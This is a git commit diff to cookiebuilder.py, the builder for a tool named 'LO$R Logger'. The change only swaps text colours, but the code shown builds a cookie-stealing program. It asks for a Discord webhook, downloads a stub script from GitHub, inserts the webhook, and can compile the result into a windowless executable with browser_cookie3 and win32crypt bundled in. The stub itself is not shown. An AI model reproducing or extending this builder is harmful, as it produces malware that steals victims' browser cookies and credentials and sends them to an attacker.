a22a7e9f779164e92852b80b56c7767fb1c3a3ae
LO$R <106779656+madhead341@users.noreply.github.com>
2023-04-05 01:05:54 +0200

    Update cookiebuilder.py

--- cookiebuilder.py
+++ cookiebuilder.py
@@ -19,30 +19,30 @@ Write.Print(Center.XCenter("""
                        \__/                                       |  $$$$$$/|  $$$$$$/                    
                                                                    \______/  \______/                                                                                                               
                                                                     made by ! LO$R#0001\n"""), Colors.blue_to_purple, interval=0)
-webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_blue, interval=0.01)
+webhook = Write.Input("\nEnter webhook URL:", Colors.blue_to_purple, interval=0.01)
 r = requests.get(webhook)
 if r.status_code == 200:
-         Write.Print("Webhook Is Working\n",Colors.green_to_blue, interval=0.01) 
+         Write.Print("Webhook Is Working\n",Colors.blue_to_purple, interval=0.01) 
          time.sleep(1) 
 else: 
-    Write.Print("Webhook Is Not Working\n",Colors.green_to_blue, interval=0.01) 
+    Write.Print("Webhook Is Not Working\n",Colors.blue_to_purple, interval=0.01) 
     time.sleep(3) 
     exit()
-name = Write.Input("Enter File Name:", Colors.green_to_blue, interval=0.01)
+name = Write.Input("Enter File Name:", Colors.blue_to_purple, interval=0.01)
 code = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/main/stubs/stub.py")
 with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(code.text.replace("webhooker", webhook))
-Write.Print("LO$R Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
-compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
+Write.Print("LO$R Logger Was SucessFully Built\n",Colors.blue_to_purple, interval=0.01)
+compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.blue_to_purple, interval=0.01)
 if compile == "y":
    os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
    os.remove(f'{name}.spec')
-   Write.Print("LO$R Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
+   Write.Print("LO$R Logger Was SucessFully Complied In Dist Folder\n",Colors.blue_to_purple, interval=0.01) 
    time.sleep(2)
-   Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using LO$R Logger\n",Colors.green_to_blue, interval=0.01) 
+   Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using LO$R Logger\n",Colors.blue_to_purple, interval=0.01) 
    time.sleep(3)
    exit()
 elif compile == "n":
-   Write.Print("Thank You For Using LO$R Logger\n",Colors.green_to_blue, interval=0.01) 
+   Write.Print("Thank You For Using LO$R Logger\n",Colors.blue_to_purple, interval=0.01) 
    time.sleep(3)
    exit()
